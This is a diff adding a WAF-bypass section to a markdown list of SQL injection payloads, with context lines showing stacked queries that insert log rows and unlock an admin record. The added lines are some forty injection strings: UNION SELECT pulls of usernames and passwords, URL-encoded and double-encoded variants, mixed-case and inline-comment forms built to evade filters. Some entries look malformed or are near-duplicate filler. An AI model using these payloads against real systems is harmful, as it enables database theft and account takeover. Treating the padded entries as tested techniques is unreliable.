@@ -439,4 +439,57 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 - `' ; INSERT INTO access_logs (ip) VALUES ('192.168.1.1') --`
 - `' ; UPDATE secure_data SET unlocked=1 WHERE username='admin' --`
 
+---
+
+## 📋 WAF Bypass Techniques
+
+### Common Bypass Techniques
+- `/**/UNION/**/SELECT/**/1,2,3--`
+- `UNION/**/SELECT/**/username,password/**/FROM/**/users--`
+- `/*!50000UNION*/SELECT 1,2,3--`
+- `UN/**/ION/**/SE/**/LECT/**/username,password/**/FROM/**/users--`
+- `' AND 1=1-- -`
+- `' OR 1=1-- -`
+- `' UNION/**/SELECT/**/NULL,NULL,NULL--`
+- `+UNION+SELECT+1,2,3--`
+- `UNION%0ASELECT%0Ausername,password%0AFROM%0Ausers--`
+- `UNION%2520SELECT%25201,2,3--`
+
+### Encoding Bypass Techniques
+- `UNION%2f%2a%2a%2fSELECT 1,2,3--`
+- `UNION%2f%2aSELECT 1,2,3%2f%2a--`
+- `UNION%09SELECT%091,2,3--`
+- `UNION%0d%0aSELECT%0d%0a1,2,3--`
+- `UNION%0dSELECT%0d1,2,3--`
+- `UNION%0aSELECT%0a1,2,3--`
+- `UNION%0a%0aSELECT%0a%0a1,2,3--`
+- `UNION%23SELECT%231,2,3--`
+- `UNION%25%30SELECT%251,2,3--`
+- `UNION%60SELECT%601,2,3--`
+
+### Case Manipulation Bypass Techniques
+- `uNiOn SeLeCt 1,2,3--`
+- `UNIon seLECT 1,2,3--`
+- `union select 1,2,3--`
+- `UnIoN sElEcT 1,2,3--`
+- `uNIoN SelECt 1,2,3--`
+- `UnIon SeLecT 1,2,3--`
+- `UNIOn SELEct 1,2,3--`
+- `UniON SEleCT 1,2,3--`
+- `uNion SeleCT 1,2,3--`
+- `union SELECT 1,2,3--`
+
+### Inline Comments Bypass Techniques
+- `SELECT/**/1,2,3--`
+- `SELECT/**/username,password/**/FROM/**/users--`
+- `SELECT/*random_comment*/1,2,3--`
+- `SELECT/**_comment_**/1,2,3--`
+- `SELECT/!comment!/1,2,3--`
+- `SELECT%0A1,2,3--`
+- `SELECT%23%0A1,2,3--`
+- `SELECT%25%23%0A1,2,3--`
+- `SELECT%2520%0A1,2,3--`
+- `SELECT%60%0A1,2,3--`
+
+
 
